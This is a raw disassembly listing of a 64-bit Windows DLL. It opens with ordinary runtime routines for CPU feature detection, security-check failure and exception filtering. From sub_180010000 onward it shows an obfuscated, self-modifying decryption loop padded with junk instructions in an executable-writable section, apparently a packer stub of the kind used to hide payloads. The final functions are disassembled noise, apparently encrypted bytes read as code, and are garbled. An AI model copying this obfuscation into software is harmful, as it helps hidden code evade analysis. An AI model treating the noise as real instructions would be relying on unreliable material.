mov r8 [ rbp + 0x150 ]
mov eax [ rbp + 0x168 ]
cpuid
mov [ r8 ] eax
mov [ r8 + 0x4 ] ebx
mov [ r8 + 0x8 ] ecx
mov [ r8 + 0xc ] edx
pop rdx
pop rcx
pop rbx
pop rax
cmp [ rbp + 0x108 ] 0x80000006
jb r-xdata
mov rbx [ rbp + 0x180 ]
mov [ rw-data ] r9d
mov [ rw-data ] r9d
lea rsp [ rbp + 0x190 ]
pop rbp
retn
mov [ rbp + 0x138 ] 0x80000006
mov [ rbp + 0xf0 ] r10
sub_180003406
push rax
push rbx
push rcx
push rdx
mov r8 [ rbp + 0xf0 ]
mov eax [ rbp + 0x138 ]
cpuid
mov [ r8 ] eax
mov [ r8 + 0x4 ] ebx
mov [ r8 + 0x8 ] ecx
mov [ r8 + 0xc ] edx
pop rdx
pop rcx
pop rbx
pop rax
movzx eax [ rbp + 0x112 ]
shl eax 0xa
mov [ rw-data ] eax
shr eax 0x1
mov [ rw-data ] eax
mov rbx [ rbp + 0x180 ]
mov [ rw-data ] r9d
mov [ rw-data ] r9d
lea rsp [ rbp + 0x190 ]
pop rbp
retn
sub_1800034ce
push rax
push rbx
push rcx
push rdx
mov eax 0x0
cpuid
cmp [ rbp + 0xf8 ] ebx
jne r-xdata
pop rdx
pop rcx
pop rbx
pop rax
mov eax [ rbp + 0x158 ]
mov edx [ rbp + 0x13c ]
cmp edx 0x4
mov [ rw-data ] eax
mov [ rw-data ] edx
jl sub_180003687
cmp [ rbp + 0xfc ] edx
jne r-xdata
cmp [ rbp + 0x100 ] ecx
jne r-xdata
mov [ rbp + 0x158 ] 0x1
mov rdx [ rbp + 0x140 ]
mov [ rdx ] eax
sub_180003529
mov [ rbp + 0x1c ] 0x0
lea rax [ rbp + 0x28 ]
mov [ rbp + 0xa8 ] rax
mov [ rbp + 0x128 ] rdi
push rax
push rbx
push rcx
push rdx
push rdi
mov r8 [ rbp + 0xa8 ]
mov edi 0x0
mov [ rbp + 0x1c ] edi
pop rdi
pop rdx
pop rcx
pop rbx
pop rax
xor ecx ecx
movsxd rdx [ rbp + 0x1c ]
xor eax eax
mov rdi [ rbp + 0x128 ]
test rdx rdx
jle sub_180003687
mov [ r8 ] eax
mov [ r8 + 0x4 ] ebx
mov [ r8 + 0x8 ] ecx
mov [ r8 + 0xc ] edx
add edi 0x1
cmp edi 0x8
jge r-xdata
add r8 0x10
jmp r-xdata
mov ecx edi
mov eax 0x4
cpuid
test eax 0x1f
je r-xdata
sub_1800035a0
mov [ rbp + 0x108 ] r12
mov [ rbp + 0x110 ] r13
mov [ rbp + 0x118 ] r14
mov [ rbp + 0x120 ] r15
inc rcx
add rax 0x10
cmp rcx rdx
jl r-xdata
and r8b 0xe0
lea r13 [ __dos_header ]
shr r8b 0x5
mov r14 r13
movzx r8d r8b
mov r15 r14
shl r8 0x4
movzx r12d [ rbp + rax + 0x2c ]
and r12d 0xfff
mov ebx [ rbp + rax + 0x2c ]
inc r12d
and ebx 0x3ff000
mov [ r13 + r8 + 0xb5a4 ] r12d
movzx r13d [ rbp + rax + 0x2e ]
and r13d 0xffc0
shr ebx 0xc
shr r13d 0x6
inc ebx
mov [ r14 + r8 + 0xb5a8 ] ebx
inc r13d
mov r14d [ rbp + rax + 0x30 ]
inc r14d
imul ebx r13d
imul r14d r12d
imul r14d ebx
mov rbx r15
shr r14d 0xa
mov [ r15 + r8 + 0xb5ac ] r13d
mov [ rbx + r8 + 0xb5a0 ] r14d
mov r8b [ rbp + rax + 0x28 ]
mov bl r8b
and bl 0x1d
cmp bl 0x1
jne r-xdata
mov r12 [ rbp + 0x108 ]
mov r13 [ rbp + 0x110 ]
mov r14 [ rbp + 0x118 ]
mov r15 [ rbp + 0x120 ]
sub_1800036ac
push rax
push rbx
push rcx
push rdx
mov r8 [ rbp + 0x20 ]
mov eax 0x2
cpuid
mov [ r8 ] eax
mov [ r8 + 0x4 ] ebx
mov [ r8 + 0x8 ] ecx
mov [ r8 + 0xc ] edx
cmp al 0x1
jle r-xdata
pop rdx
pop rcx
pop rbx
pop rax
movzx eax [ rbp + 0xb0 ]
mov ecx 0x10
mov edx eax
shl rdx 0x2
cmp eax 0x4
cmovg rdx rcx
xor eax eax
test rdx rdx
jle sub_18000387f
cmp al 0x2
jle r-xdata
mov eax 0x2
cpuid
mov [ r8 + 0x10 ] eax
mov [ r8 + 0x14 ] ebx
mov [ r8 + 0x18 ] ecx
mov [ r8 + 0x1c ] edx
cmp al 0x3
jle r-xdata
mov eax 0x2
cpuid
mov [ r8 + 0x20 ] eax
mov [ r8 + 0x24 ] ebx
mov [ r8 + 0x28 ] ecx
mov [ r8 + 0x2c ] edx
mov eax 0x2
cpuid
mov [ r8 + 0x30 ] eax
mov [ r8 + 0x34 ] ebx
mov [ r8 + 0x38 ] ecx
mov [ r8 + 0x3c ] edx
sub_180003743
mov [ rbp + 0x130 ] rsi
mov [ rbp + 0x128 ] rdi
mov rdi rax
mov [ rbp + 0x108 ] r12
mov [ rbp + 0x110 ] r13
mov r13 rdx
mov [ rbp + 0x118 ] r14
mov [ rbp + 0x120 ] r15
nop [ rax + rax ] eax
inc rdi
cmp rdi r13
jl r-xdata
xor r14d r14d
lea r12 [ rbp + rdi * 4 + 0xb0 ]
test [ rbp + rdi * 4 + 0xb3 ] 0x80
jne r-xdata
mov rsi [ rbp + 0x130 ]
mov rdi [ rbp + 0x128 ]
mov r12 [ rbp + 0x108 ]
mov r13 [ rbp + 0x110 ]
mov r14 [ rbp + 0x118 ]
mov r15 [ rbp + 0x120 ]
mov rsi [ rbp + 0x130 ]
pxor xmm0 xmm0
mov rdi [ rbp + 0x128 ]
mov r12 [ rbp + 0x108 ]
mov r13 [ rbp + 0x110 ]
mov r14 [ rbp + 0x118 ]
mov r15 [ rbp + 0x120 ]
movdqa [ rw-data ] xmm0
movdqa [ rw-data ] xmm0
movdqa [ rw-data ] xmm0
jmp sub_18000387f
lea rcx [ __dos_header ]
mov bl [ rcx + r15 * 8 + 0xa040 ]
and bl 0x7
movzx esi bl
test rsi rsi
je r-xdata
inc r14
cmp r14 0x4
jl r-xdata
cmp rsi 0x2
je r-xdata
movzx r15d [ r14 + r12 ]
cmp r15 0xff
je r-xdata
cmp r15 0x49
jne r-xdata
lea rcx [ __dos_header ]
shl rsi 0x4
mov r8 rcx
movzx ebx [ rcx + r15 * 8 + 0xa040 ]
and ebx 0x7ff8
shr ebx 0x3
mov [ r8 + rsi + 0xb5a4 ] ebx
mov rbx r8
mov ecx [ rcx + r15 * 8 + 0xa040 ]
and ecx 0x3f8000
shr ecx 0xf
mov [ rbx + rsi + 0xb5a8 ] ecx
mov rcx r8
movzx ecx [ rcx + r15 * 8 + 0xa042 ]
and ecx 0xffc0
shr ecx 0x6
mov [ rbx + rsi + 0xb5ac ] ecx
mov rcx r8
mov r15d [ rcx + r15 * 8 + 0xa044 ]
mov [ rcx + rsi + 0xb5a0 ] r15d
mov [ rbp + 0x18 ] 0x1
lea rcx [ rbp ]
mov [ rbp + 0x10 ] rcx
push rax
push rbx
push rcx
push rdx
mov r8 [ rbp + 0x10 ]
mov eax [ rbp + 0x18 ]
cpuid
mov [ r8 ] eax
mov [ r8 + 0x4 ] ebx
mov [ r8 + 0x8 ] ecx
mov [ r8 + 0xc ] edx
pop rdx
pop rcx
pop rbx
pop rax
mov r8d [ rbp ]
mov ecx r8d
shr ecx 0x8
and ecx 0xf
cmp ecx 0xf
jne r-xdata
mov ebx r8d
shr ebx 0x14
and ebx 0xf0
or ebx ecx
cmp ebx 0xf
jne r-xdata
mov ecx r8d
mov ebx 0x3
shr ecx 0xc
shr r8d 0x4
and ecx 0xf0
and r8d 0xf
or ecx r8d
cmp ecx 0x6
cmove rsi rbx
jmp r-xdata
sub_18000387f
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov rax 0x69746e6568747541
lea r10 [ rbp + 0x108 ]
mov [ rbp + 0x118 ] rax
mov [ rbp + 0x120 ] 0x444d4163
mov [ rbp + 0x124 ] dl
mov [ rbp + 0x178 ] edx
mov [ rbp + 0x170 ] r10
cmp [ rw-data ] 0x0
jbe r-xdata
mov ecx [ rw-data ]
test ecx ecx
jbe r-xdata
mov eax [ rw-data ]
cmp eax r10d
jbe r-xdata
mov r11d [ rw-data ]
mov r10d ecx
imul r11d [ rw-data ]
mov eax [ rw-data ]
cmp eax r10d
jbe r-xdata
mov r11d [ rw-data ]
mov r10d eax
imul r11d [ rw-data ]
shl r10d 0xa
shl ecx 0xa
mov eax r10d
mov edx ecx
shr eax 0x1f
shr edx 0x1f
mov [ rw-data ] r10d
add r10d eax
mov [ rw-data ] ecx
add ecx edx
sar r10d 0x1
sar ecx 0x1
mov [ rw-data ] r10d
mov [ rw-data ] ecx
mov [ rw-data ] r11d
jmp r-xdata
mov r11d [ rw-data ]
mov r10d eax
imul r11d [ rw-data ]
mov rbx [ rbp + 0x180 ]
mov [ rw-data ] r9d
mov [ rw-data ] r9d
lea rsp [ rbp + 0x190 ]
pop rbp
retn
sub_180003970
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call [ type_info::~type_info@IAT ]
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call sub_1800228a0
sub_180003a10
push rbx
sub rsp 0x20
mov r11d [ r8 ]
mov rbx rdx
mov r9 rcx
and r11d 0xfffffff8
test [ r8 ] 0x4
mov r10 rcx
je r-xdata
movsxd rax r11d
mov rdx [ rax + r10 ]
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0x8 ]
add rcx [ rbx + 0x8 ]
test [ rcx + 0x3 ] 0xf
je r-xdata
mov eax [ r8 + 0x8 ]
movsxd r10 [ r8 + 0x4 ]
neg eax
add r10 rcx
movsxd rcx eax
and r10 rcx
xor r9 rdx
mov rcx r9
add rsp 0x20
pop rbx
jmp sub_1800039d0
movzx eax [ rcx + 0x3 ]
and eax 0xfffffff0
cdqe
add r9 rax
sub_180003a90
sub rsp 0x10
mov [ rsp ] r10
mov [ rsp + 0x8 ] r11
xor r11 r11
lea r10 [ rsp + 0x18 ]
sub r10 rax
cmovb r10 r11
mov r11 [ gs : 0x10 ]
cmp r10 r11
jae r-xdata
mov r10 [ rsp ]
mov r11 [ rsp + 0x8 ]
add rsp 0x10
retn
and r10w 0xf000
lea r11 [ r11 - 0x1000 ]
mov [ r11 ] 0x0
cmp r10 r11
jne r-xdata
sub_180003ae0
push rbx
sub rsp 0x20
mov rbx rcx
call [ IsDebuggerPresent@IAT ]
mov ecx 0x1
mov [ rw-data ] eax
call __crt_debugger_hook
mov rcx rbx
call __crtUnhandledException
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0xc0000409
add rsp 0x20
pop rbx
jmp __crtTerminateProcess
mov ecx 0x1
call __crt_debugger_hook
sub_180003b2c
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
mov ecx 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
lea rcx [ rw-data ]
call __crtCapturePreviousContext
mov rax [ rsp + 0x38 ]
mov [ rw-data ] rax
lea rax [ rsp + 0x38 ]
add rax 0x8
mov [ rw-data ] rax
mov rax [ rw-data ]
mov [ rw-data ] rax
mov rax [ rsp + 0x40 ]
mov [ rw-data ] rax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
mov eax 0x8
imul rax rax 0x0
lea rcx [ rw-data ]
mov [ rcx + rax ] 0x2
mov eax 0x8
imul rax rax 0x0
mov rcx [ rw-data ]
mov [ rsp + rax + 0x20 ] rcx
mov eax 0x8
imul rax rax 0x1
mov rcx [ rw-data ]
mov [ rsp + rax + 0x20 ] rcx
lea rcx [ r--data ]
call sub_180003ae0
add rsp 0x38
retn
mov ecx 0x2
int 0x29
__crtCaptureCurrentContext
mov [ rsp + 0x20 ] rbx
push rdi
sub rsp 0x40
mov rbx rcx
call [ RtlCaptureContext@IAT ]
mov rdi [ rbx + 0xf8 ]
lea rdx [ rsp + 0x50 ]
xor r8d r8d
mov rcx rdi
call [ RtlLookupFunctionEntry@IAT ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x68 ]
add rsp 0x40
pop rdi
retn
and [ rsp + 0x38 ] 0x0
mov rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x58 ]
mov [ rsp + 0x30 ] rcx
lea rcx [ rsp + 0x60 ]
mov r9 rax
mov [ rsp + 0x28 ] rcx
xor ecx ecx
mov r8 rdi
mov [ rsp + 0x20 ] rbx
call [ RtlVirtualUnwind@IAT ]
__crtCapturePreviousContext
push rbx
push rsi
push rdi
sub rsp 0x40
mov rbx rcx
call [ RtlCaptureContext@IAT ]
mov rsi [ rbx + 0xf8 ]
xor edi edi
add rsp 0x40
pop rdi
pop rsi
pop rbx
retn
and [ rsp + 0x38 ] 0x0
mov rdx [ rsp + 0x60 ]
lea rcx [ rsp + 0x68 ]
mov [ rsp + 0x30 ] rcx
lea rcx [ rsp + 0x70 ]
mov r9 rax
mov [ rsp + 0x28 ] rcx
xor ecx ecx
mov r8 rsi
mov [ rsp + 0x20 ] rbx
call [ RtlVirtualUnwind@IAT ]
inc edi
cmp edi 0x2
jl r-xdata
lea rdx [ rsp + 0x60 ]
xor r8d r8d
mov rcx rsi
call [ RtlLookupFunctionEntry@IAT ]
test rax rax
je r-xdata
__crtIsPackagedApp
push rbx
sub rsp 0x20
mov eax [ rw-data ]
xor ebx ebx
test eax eax
jns r-xdata
setg bl
mov eax ebx
add rsp 0x20
pop rbx
retn
mov rax [ rw-data ]
mov [ rsp + 0x30 ] ebx
xor rax [ rw-data ]
je r-xdata
mov eax ebx
lea rcx [ rsp + 0x30 ]
xor edx edx
call rax
cmp eax 0x7a
lea eax [ rbx + 0x1 ]
je r-xdata
mov [ rw-data ] eax
test eax eax
sub_180003fd0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
xor edi edi
mov rbx r8
mov r9 rdx
mov esi ecx
mov [ rsp + 0x38 ] rdi
test rdx rdx
je r-xdata
mov rdx rdi
mov ecx esi
call [ rw-data ]
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov rax [ rdx ]
lea r8 [ rsp + 0x48 ]
lea rdx [ r--data ]
mov rcx r9
call [ rax ]
test eax eax
js r-xdata
mov rdi [ rsp + 0x38 ]
mov rcx [ rsp + 0x48 ]
mov rdx rbx
mov rax [ rcx ]
call [ rax + 0x18 ]
mov rcx [ rsp + 0x48 ]
mov rdx [ rcx ]
mov ebx eax
call [ rdx + 0x10 ]
test ebx ebx
jne r-xdata
lea rdx [ rsp + 0x38 ]
xor ecx ecx
call [ GetErrorInfo@IAT ]
mov rcx [ rsp + 0x38 ]
test eax eax
cmovne rcx rdi
mov rdi rcx
mov [ rsp + 0x38 ] rcx
jmp r-xdata
sub_180004070
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
mov eax [ rdx + 0x8 ]
mov [ rcx + 0x8 ] eax
mov rax [ rdx + 0x10 ]
mov [ rcx + 0x18 ] 0x0
mov [ rcx + 0x10 ] rax
mov rcx rax
test rax rax
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
mov rax [ rax ]
call [ rax + 0x8 ]
sub_1800040b0
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
mov rcx [ rcx + 0x10 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
call [ rax + 0x10 ]
add rsp 0x20
pop rbx
retn
add rsp 0x20
pop rbx
jmp [ LocalFree@IAT ]
sub_1800040f0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov edi edx
mov [ rcx ] rax
mov rcx [ rcx + 0x10 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
call [ rax + 0x10 ]
test dil 0x1
je r-xdata
call [ LocalFree@IAT ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_1800228a0
sub_180004196
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x100 ] rcx
mov rax [ rcx ]
mov edx [ rax ]
mov [ rbp + 0xa8 ] edx
mov [ rbp + 0xf8 ] rcx
mov [ rbp + 0x50 ] edx
mov eax [ rbp + 0x50 ]
cmp eax 0xe06d7363
jne r-xdata
mov [ rbp + 0x30 ] 0x0
mov rdx [ rbp + 0xf8 ]
mov ecx [ rbp + 0x50 ]
call _XcptFilter
mov [ rbp + 0x30 ] eax
jmp r-xdata
mov eax [ rbp + 0x30 ]
add rsp 0x20
pop rbp
retn
sub_1800041f6
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x110 ] rcx
mov rax [ rcx ]
mov edx [ rax ]
mov [ rbp + 0x98 ] edx
mov [ rbp + 0xd0 ] rcx
mov [ rbp + 0x70 ] edx
mov eax [ rbp + 0x70 ]
cmp eax 0xe06d7363
jne r-xdata
mov [ rbp + 0x38 ] 0x0
mov rdx [ rbp + 0xd0 ]
mov ecx [ rbp + 0x70 ]
call _XcptFilter
mov [ rbp + 0x38 ] eax
jmp r-xdata
mov eax [ rbp + 0x38 ]
add rsp 0x20
pop rbp
retn
sub_180004256
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x130 ] rcx
mov rax [ rcx ]
mov edx [ rax ]
mov [ rbp + 0xcc ] edx
mov [ rbp + 0xf0 ] rcx
mov [ rbp + 0x60 ] edx
mov eax [ rbp + 0x60 ]
cmp eax 0xe06d7363
jne r-xdata
mov [ rbp + 0x48 ] 0x0
mov rdx [ rbp + 0xf0 ]
mov ecx [ rbp + 0x60 ]
call _XcptFilter
mov [ rbp + 0x48 ] eax
jmp r-xdata
mov eax [ rbp + 0x48 ]
add rsp 0x20
pop rbp
retn
sub_1800042b6
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x120 ] rcx
mov rax [ rcx ]
mov edx [ rax ]
mov [ rbp + 0x8c ] edx
mov [ rbp + 0xe0 ] rcx
mov [ rbp + 0x80 ] edx
mov eax [ rbp + 0x80 ]
cmp eax 0xe06d7363
jne r-xdata
mov [ rbp + 0x24 ] 0x0
mov rdx [ rbp + 0xe0 ]
mov ecx [ rbp + 0x80 ]
call _XcptFilter
mov [ rbp + 0x24 ] eax
jmp r-xdata
mov eax [ rbp + 0x24 ]
add rsp 0x20
pop rbp
retn
sub_180004316
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x108 ] rcx
mov rax [ rcx ]
mov edx [ rax ]
mov [ rbp + 0xd8 ] edx
mov [ rbp + 0x90 ] rcx
mov [ rbp + 0x28 ] edx
mov eax [ rbp + 0x28 ]
cmp eax 0xe06d7363
jne r-xdata
mov [ rbp + 0x34 ] 0x0
mov rdx [ rbp + 0x90 ]
mov ecx [ rbp + 0x28 ]
call _XcptFilter
mov [ rbp + 0x34 ] eax
jmp r-xdata
mov eax [ rbp + 0x34 ]
add rsp 0x20
pop rbp
retn
sub_180004376
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x118 ] rcx
mov rax [ rcx ]
mov edx [ rax ]
mov [ rbp + 0xb8 ] edx
mov [ rbp + 0xa0 ] rcx
mov [ rbp + 0x40 ] edx
mov eax [ rbp + 0x40 ]
cmp eax 0xe06d7363
jne r-xdata
mov [ rbp + 0x4c ] 0x0
mov rdx [ rbp + 0xa0 ]
mov ecx [ rbp + 0x40 ]
call _XcptFilter
mov [ rbp + 0x4c ] eax
jmp r-xdata
mov eax [ rbp + 0x4c ]
add rsp 0x20
pop rbp
retn
sub_1800043d6
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x128 ] rcx
mov rax [ rcx ]
mov edx [ rax ]
mov [ rbp + 0xe8 ] edx
mov [ rbp + 0xb0 ] rcx
mov [ rbp + 0x58 ] edx
mov eax [ rbp + 0x58 ]
cmp eax 0xe06d7363
jne r-xdata
mov [ rbp + 0x68 ] 0x0
mov rdx [ rbp + 0xb0 ]
mov ecx [ rbp + 0x58 ]
call _XcptFilter
mov [ rbp + 0x68 ] eax
jmp r-xdata
mov eax [ rbp + 0x68 ]
add rsp 0x20
pop rbp
retn
sub_180004436
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x138 ] rcx
mov rax [ rcx ]
mov edx [ rax ]
mov [ rbp + 0xc8 ] edx
mov [ rbp + 0xc0 ] rcx
mov [ rbp + 0x78 ] edx
mov eax [ rbp + 0x78 ]
cmp eax 0xe06d7363
jne r-xdata
mov [ rbp + 0x88 ] 0x0
mov rdx [ rbp + 0xc0 ]
mov ecx [ rbp + 0x78 ]
call _XcptFilter
mov [ rbp + 0x88 ] eax
jmp r-xdata
mov eax [ rbp + 0x88 ]
add rsp 0x20
pop rbp
retn
sub_180010000
push rax
push rcx
push rdx
push rbx
push rbp
push rsi
push rdi
push r8
push r9
push r10
push r11
pop rdi
push rdi
mov rdi rsi
mov rbx r10
add rsi r10
mov rdi 0xffffffff8d0b1d1b
xor rsi r10
inc rcx
ror rcx 0x51
xor r11 rcx
add rbp r9
push r11
pop rax
inc r8
jmp rwxdata
mov rcx rdx
ror rcx 0x17
ror r9 0x6f
mov r10 0xffffffffa83f495c
xor r10 rbp
pop rdx
push rdx
add rax r8
push rcx
pop rax
dec rdx
mov rdi 0x395435e5
ror rax 0x68
mov rdi r11
dec r10
inc r8
dec rdx
ror r10 0x50
push rbx
pop rsi
jmp rwxdata
xor rax r8
pop rbp
push rbp
ror r8 0xd
pop rsi
push rsi
pop rax
push rax
jmp rwxdata
ror r10 0x52
add r10 rsi
nop
mov rax rdi
ror r11 0x6b
ror rdx 0x9f
inc rdi
pop rax
push rax
mov rbp r10
ror rdi 0x74
ror rax 0x2d
ror rdx 0x5e
push rdx
pop rdx
add rdx r8
dec r11
pop rsi
push rsi
inc r10
jmp rwxdata
add rsi rdx
jmp rwxdata
inc rcx
inc r10
inc rdx
ror r9 0x87
mov rbx 0x458c3d4a
add rdi rdx
ror rsi 0x7c
xor rsi rdi
xor rsi rsi
nop
mov rdx 0xfffffffff6e76ff4
push r11
pop r10
dec r11
jmp rwxdata
nop
push r10
pop r10
ror rbp 0x85
push rdx
pop rdi
push rbx
pop r11
ror r8 0x93
mov r8 0x5baf7fef
ror rbx 0x51
ror rbp 0xb1
ror rax 0x27
mov rbp 0x78666574
xor rbp rdx
ror rdx 0x58
ror rcx 0xc4
nop
nop
ror rbp 0x4a
mov r10 0x2a2ce69a
xor rbp rsi
nop
jmp rwxdata
dec r9
inc rbx
pop r11
push r11
xor rax rbx
mov rdx 0x3c989de3
xor rbx r10
nop
jmp rwxdata
nop
jmp rwxdata
nop
push r9
pop r8
ror r9 0x15
inc rcx
ror rax 0x35
inc rbx
dec rcx
dec rdx
ror rbp 0x47
dec rdi
jmp rwxdata
pop r9
push r9
nop
nop
jmp rwxdata
ror rbx 0x8
ror rbx 0x3
nop
ror rdi 0x72
push r10
pop rcx
inc r10
push rax
pop rax
jmp rwxdata
ror rax 0x50
xor r10 rdx
ror rcx 0x85
xor r8 r10
dec r11
inc rdx
ror r11 0xbf
pop r8
push r8
xor rsi r9
mov r10 r11
nop
mov r10 0x3ce7d446
jmp rwxdata
jmp rwxdata
nop
mov rdi rbx
add rcx rcx
ror r10 0x2e
xor r8 rdi
add rax r11
add rsi rbx
ror r9 0xad
nop
add rcx r10
jmp rwxdata
xor rbx r8
dec r9
ror r9 0x69
xor r8 rsi
ror r8 0x5c
dec rax
ror r10 0xb0
inc rcx
ror rbx 0x86
add rcx rbp
mov rax 0xffffffffef968a82
ror rbp 0x7f
mov rax 0xffffffffec0f33a9
ror rdi 0x19
ror rax 0xab
pop rbx
push rbx
ror rbp 0x61
inc rcx
nop
mov rdx 0xffffffffe5fd5054
inc r8
push r10
pop rbp
push r11
pop rcx
nop
ror rbx 0x46
inc r11
dec r10
dec r8
xor rsi r8
nop
ror rbp 0x8c
inc rcx
ror r8 0x50
ror rax 0x1f
add rsi r10
pop r11
push r11
xor rcx rcx
ror rcx 0x4f
add rcx r9
ror r11 0x1e
push rdi
pop rbp
pop r11
push r11
ror rcx 0x7e
ror r8 0x7a
ror rax 0xb4
push r8
pop r11
inc rcx
mov rax rax
dec rbp
xor rdi rax
pop rcx
push rcx
xor r11 rbx
xor rdi r9
dec rdi
nop
inc rbp
xor rcx rsi
ror rbx 0x44
inc rdi
inc rcx
xor rcx rsi
add r10 rcx
inc rbp
dec rbp
mov r8 rdi
mov r11 0xffffffffdc39682f
mov rdx rbp
push r8
pop rbx
nop
mov rdx rbp
ror rbx 0x10
add rsi rbx
xor rax rcx
ror r11 0xac
xor rcx r10
nop
inc rax
ror rsi 0x1b
mov r10 rdx
pop rbp
push rbp
inc r10
pop rcx
push rcx
add rax rbx
ror rsi 0x77
pop rax
push rax
dec rbp
xor r10 rdi
add rax rcx
mov rcx rax
mov rdi r8
mov rsi 0x54045f96
mov rdi 0x1c255c83
xor r9 rdi
nop
push r10
pop rcx
ror rax 0xbf
xor r10 r11
ror rbp 0x39
nop
pop rax
push rax
mov rbx 0x317bd7ae
dec rbp
pop r8
push r8
mov rsi rbp
nop
pop r10
push r10
pop rdx
push rdx
mov rcx 0x4371acf3
mov r9 0xffffffffc94b50a3
add rbx rsi
mov rdi 0x75c8ec2f
inc r10
mov rbx 0xffffffffa104367f
pop rdx
push rdx
xor rax r10
push r9
pop rbp
pop rbx
push rbx
ror r11 0x23
pop r9
push r9
mov rdi r11
mov rbx r9
mov rax rax
dec rdi
xor rbx rbx
push rbp
pop rcx
inc rcx
mov r9 0xffffffff966312c3
ror rdi 0x4a
pop rsi
push rsi
pop rsi
push rsi
mov rcx 0x654e87a2
mov rax rbp
mov rax 0xfffffffff692f865
mov r11 rdx
push r10
pop rcx
mov rsi 0xffffffffee448c38
pop r9
push r9
inc rax
ror rdx 0x3c
mov rdx 0xfffffffffb8ef696
nop
jmp rwxdata
inc rbp
xor rbx rcx
ror r8 0x82
xor rdi r11
nop
dec rbx
call $+5
xor r10 r8
add rbp rcx
jmp rwxdata
pop rcx
jmp rwxdata
add r10 rdi
add r11 r8
sub rcx 0x3f7
ror rax 0x4b
ror r9 0x7a
mov r11 rcx
sub rcx 0x10000
dec rbp
mov rax rsi
mov rax r11
xor r8 rdi
mov rdi 0xffffffffed77825f
add rax 0x1000
dec r10
dec rdx
mov r9 0x30000
mov rbx 0xffffffff98099747
dec r8
mov r10 0xa0854109b6a16d42
nop
inc rax
ror rdx 0x73
dec r9
pop r8
push r8
xor rdi rdi
dec r9
ror rbp 0x84
ror rdi 0x65
jmp rwxdata
dec r9
mov r8 0x78f7a0aa
dec r9
dec r9
xor rsi rsi
nop
mov r8 rsi
dec r9
mov r8 0x79eb8afc
dec r9
ror r8 0x2a
push r8
pop rsi
dec r9
je rwxdata
mov rdx rdx
mov r9 0xe9
dec rbp
mov [ r11 ] r9
nop
xor rdi rbx
pop r10
push r10
inc r11
push rcx
pop r10
ror rbp 0x99
mov rbx r10
mov r9 0x12b3b
mov rdx rdx
inc r8
jmp rwxdata
jmp rwxdata
mov [ r11 ] r9
push rdi
pop rbx
ror rbx 0x6f
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rbp
pop rbx
pop rdx
pop rcx
pop rax
jmp sub_180010000
mov rbx [ rax ]
add rbp r8
xor rbx r10
mov rdx rsi
pop rbp
push rbp
nop
ror r10 0x1
ror r8 0xa4
mov r8 r8
mov [ rax ] rbx
dec rbp
pop rdx
push rdx
inc rax
xor r8 r8
inc rax
inc rbp
inc rax
pop rdx
push rdx
inc rax
mov rsi r8
pop r8
push r8
dec rbp
inc rax
add rdi rdi
xor rsi rbp
mov r8 0x8f770
inc rax
dec rbp
inc rbp
inc rax
xor rdi rsi
ror r8 0x5c
jmp rwxdata
sub_180011a4c
cmc
or dl bl
or r12 r8
loopne rwxdata
or eax [ rcx - 0x33 ]
pop rcx
out 0x54 al
jo rwxdata
scasb [ rdi ]
out 0x41 al
int3
and ebx [ 0x160b6b6c9 ]
loopne rwxdata
cli
std
sub_180011b73
std
or al 0x86
add ah [ rdx + rax * 2 ]
enter 0x634e 0x70
insd
adc eax [ rdx + 0x5550b57a ]
pop rsi
mov dil r10b
mov dl [ rax - 0x5f ]
mov dh 0x51
scasd [ rdi ]
push 0x74f4aae8
jpo rwxdata
xchg [ rdx ] al
and al 0x42
out dx al
xchg [ rax - 0x2d ] bh
pop rbx
mov bh 0xad
sub_180011b94
loopne rwxdata
pop rsi
mov dil r10b
mov dl [ rax - 0x5f ]
mov dh 0x51
scasd [ rdi ]
push 0x74f4aae8
jpo rwxdata
xchg [ rax - 0x2d ] bh
pop rbx
mov bh 0xad
xchg [ rdx ] al
and al 0x42
enter 0x634e 0x70
insd
adc eax [ rdx + 0x5550b57a ]
out dx al
sub_180011e80
loopne rwxdata
sbb al 0x8b
out dx al
cld
push rsi
hlt
adc al 0xcd
and ebp [ rsi + 0x48521945 ]
loope rwxdata
shr [ rbx ] cl
leave
fisubr [ rax ]
jmp rwxdata
test eax ebp
cmp eax 0xc0bd49ac
loope rwxdata
push rax
pop rbx
popfq
mov ebp 0x10088c6d
and edi eax
and dl [ rax ]
adc eax 0x2bd53d75
pop rsi
mov [ rax ] esp
imul ebx [ rcx + 0x54 ] 0x36
hlt
sub_180011ec0
